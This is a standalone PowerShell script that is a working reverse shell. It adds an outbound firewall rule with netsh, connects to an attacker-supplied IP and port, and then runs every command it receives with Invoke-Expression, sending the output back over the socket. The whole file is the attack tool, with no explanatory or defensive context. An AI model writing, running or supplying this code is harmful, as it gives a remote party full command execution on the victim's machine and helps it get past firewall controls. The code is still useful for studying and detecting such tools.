param (
    [string]$ip,
    [int]$port
)

function Open-FirewallPort {
    param (
        [int]$port
    )
    if ($PSVersionTable.PSVersion.Major -ge 5) {
        Write-Host "Opening port $port in the firewall..."
        netsh advfirewall firewall add rule name="PowerShellClient" dir=out action=allow protocol=TCP remoteport=$port
    } else {
        Write-Host "This script requires PowerShell 5.0 or higher to modify firewall rules."
    }
}

function Connect-Back {
    param (
        [string]$ip,
        [int]$port
    )
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)

    while ($true) {
        $data = $reader.ReadLine()
        if ($data) {
            $output = Invoke-Expression $data 2>&1 | Out-String
            $output = $output.Trim()
            $writer.WriteLine($output)
            $writer.Flush()
        }
    }

    $writer.Close()
    $reader.Close()
    $client.Close()
}

# Main execution
Open-FirewallPort -port $port
Connect-Back -ip $ip -port $port
